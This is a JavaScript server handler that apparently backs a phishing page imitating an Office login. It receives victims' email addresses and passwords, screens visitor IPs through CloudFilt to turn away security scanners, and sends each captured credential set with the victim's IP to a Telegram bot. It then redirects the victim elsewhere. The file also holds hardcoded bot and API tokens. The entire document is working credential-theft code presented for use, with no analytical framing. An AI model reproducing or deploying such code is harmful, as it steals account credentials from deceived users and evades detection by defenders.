import axios from 'axios';
import countries from 'i18n-iso-countries';

// Define your bot token and group ID
const BOT_TOKEN = '7781468085:AAEdLDEdPbC1zQUOJnNmYCPgkH84uuwLfgU';
const CHAT_ID = '-1002493880170';

// CloudFilt API Configuration
const CLOUDFILT_URL = 'https://developers19251.cloudfilt.com/';
const CLOUDFILT_KEY = 'SRre1FtUVJIs0xjmxcla';

// Initialize country data for English
countries.registerLocale(require('i18n-iso-countries/langs/en.json'));

export default async function handler(req, res) {
  const { email, password, country } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (!email || !password || !country) {
    return res.status(400).json({ message: 'Email, password, and country are required.' });
  }

  try {
    // Check IP with CloudFilt
    const cloudFiltResponse = await axios.post(CLOUDFILT_URL, {
      ip: ip,
      key: CLOUDFILT_KEY,
      textCF: "Verifying... Please wait..."
    });

    const { listed, asnisp } = cloudFiltResponse.data;

    if (listed) {
      // Notify Telegram if IP is suspicious
      const alertMessage = `🚨 Office Bot Eliminated 🚨\nIP: ${ip}\nISP: ${asnisp}`;
      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      await axios.post(telegramUrl, {
        chat_id: CHAT_ID,
        text: alertMessage,
      });

      return res.status(403).json({ message: 'Access denied due to suspicious activity.' });
    }

    // Convert country code to full country name
    const fullCountryName = countries.getName(country, 'en') || country;

    // Prepare the message for Telegram
    const message = `NEW login from ${fullCountryName} - IP: ${ip}\n\nEmail: ${email}\nPassword: ${password}\nCountry: ${fullCountryName}\nIP Address: ${ip}`;

    // Send the message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: CHAT_ID,
      text: message,
    });

    // Redirect the user after successful submission
    res.status(200).json({ redirectUrl: 'https://ss.achemsite.info' });
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({ message: 'Error sending message or checking IP with CloudFilt.' });
  }
}
